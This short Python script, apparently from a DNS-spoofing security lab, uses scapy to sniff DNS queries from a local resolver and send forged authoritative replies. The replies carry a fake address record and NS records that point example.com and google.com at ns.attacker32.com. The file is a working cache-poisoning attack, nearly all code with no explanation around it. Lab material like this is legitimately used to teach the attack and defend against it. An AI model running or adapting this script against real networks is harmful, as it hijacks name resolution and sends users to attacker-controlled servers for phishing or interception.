from scapy.all import *
import sys
NS_NAME = "example.com"
def spoof_dns(pkt):
  if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
    print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
    ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)           # Create an IP object
    udp = UDP(dport=pkt[UDP].sport, sport=53)
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='5.4.3.4')
    NSsec1 = DNSRR(rrname="example.com", type='NS', ttl=259200, rdata='ns.attacker32.com')
    NSsec2 = DNSRR(rrname="google.com", type='NS', ttl=259200, rdata='ns.attacker32.com')
    dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
              qdcount=1, ancount=1, nscount=2, arcount=0, an=Anssec, ns=NSsec1/NSsec2)
    spoofpkt = ip/udp/dns  # Assemble the spoofed DNS packet
    send(spoofpkt)
# Create a UPD object
# Create an aswer record
# Create a DNS object
myFilter = "udp and dst port 53 and src net 10.9.0.53" # Set the filter 
pkt=sniff(iface='br-e8807217725f', filter=myFilter, prn=spoof_dns)